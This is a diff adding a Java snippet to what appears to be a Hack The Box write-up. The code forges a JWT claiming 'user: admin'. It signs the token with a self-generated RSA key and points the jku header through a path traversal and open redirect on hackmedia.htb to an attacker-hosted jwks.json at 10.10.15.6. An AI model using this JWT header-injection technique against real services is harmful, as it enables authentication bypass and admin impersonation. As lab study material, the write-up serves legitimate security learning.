@@ -179,6 +179,89 @@ jwks.json
 }
 ````
 
+JWK and JWT
+````java
+package com.company;
+import java.net.URI;
+import java.net.URISyntaxException;
+import java.security.*;
+import java.security.interfaces.*;
+import java.util.*;
+
+import com.google.gson.Gson;
+import com.google.gson.GsonBuilder;
+import com.google.gson.JsonParser;
+import com.nimbusds.jose.jwk.JWK;
+import com.nimbusds.jose.jwk.KeyUse;
+import com.nimbusds.jose.jwk.RSAKey;
+import com.nimbusds.jwt.JWTClaimsSet;
+
+import com.nimbusds.jose.*;
+import com.nimbusds.jose.crypto.*;
+import com.nimbusds.jose.jwk.gen.*;
+import com.nimbusds.jwt.*;
+
+public class Main {
+
+    public static void main(String[] args) throws URISyntaxException, JOSEException, NoSuchAlgorithmException {
+        jwkGen();
+
+        jwtGen();
+    }
+
+    public static void jwtGen()throws JOSEException, URISyntaxException  {
+        //JWT
+        //header
+        RSAKey rsaJWK = new RSAKeyGenerator(2048)
+                .keyID("1337")
+                .generate();
+        RSAKey rsaPublicJWK = rsaJWK.toPublicJWK();
+
+        JWSSigner signer = new RSASSASigner(rsaJWK);
+
+        // payload
+        JWTClaimsSet payload = new JWTClaimsSet.Builder()
+                .claim("user","admin")
+                .build();
+
+        //signature
+        SignedJWT signedJWT = new SignedJWT(
+                new JWSHeader.Builder(JWSAlgorithm.RS256)
+                        .jwkURL(new URI("http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json"))
+                        .type(JOSEObjectType.JWT)
+                        .build(),
+                payload
+        );
+
+        signedJWT.sign(signer);
+
+        String serialized = signedJWT.serialize();
+
+        //System.out.println(payload.toJSONObject());
+        System.out.println(serialized);
+    }
+
+    public static void jwkGen() throws NoSuchAlgorithmException {
+        //JWK
+        // Generate the RSA key pair
+        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
+        gen.initialize(2048);
+        KeyPair keyPair = gen.generateKeyPair();
+
+        // Convert to JWK format
+        JWK jwk = new RSAKey.Builder((RSAPublicKey) keyPair.getPublic())
+                .privateKey((RSAPrivateKey) keyPair.getPrivate())
+                .keyUse(KeyUse.SIGNATURE)
+                .keyID(UUID.randomUUID().toString())
+                .build();
+
+        //Printing on screen
+        Gson gson = new GsonBuilder().setPrettyPrinting().create();
+        System.out.println(gson.toJson(JsonParser.parseString(jwk.toJSONString())));
+    }
+}
+````
+
 
 
 
